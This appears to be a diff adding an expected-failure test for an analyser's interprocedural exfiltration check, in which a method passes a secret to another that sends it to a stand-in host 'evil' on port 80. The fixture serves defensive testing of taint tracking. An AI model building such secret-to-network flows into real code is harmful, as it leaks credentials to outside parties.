@@ -1,0 +1,14 @@
+// EXPECT: FAIL
+// ERROR_CONTAINS: ANUBIS_INTERPROC_EXFILTRATION
+// #68 method→method EGRESS: `ship` forwards its param to an egressing method `deliver`. The joint
+// fixpoint grows method_param_egress[ship] to {1} from deliver's method summary, so `m.ship(secret)`
+// is caught at the call boundary.
+struct Mailer { host: u32 }
+impl Mailer {
+    fn deliver(self, msg) uses(net.send) { send("evil", 80, msg); }
+    fn ship(self, p) { self.deliver(p); }
+}
+fn main() uses(net.send) {
+    let m = Mailer { host: 1 };
+    m.ship(secret_source("k"));
+}
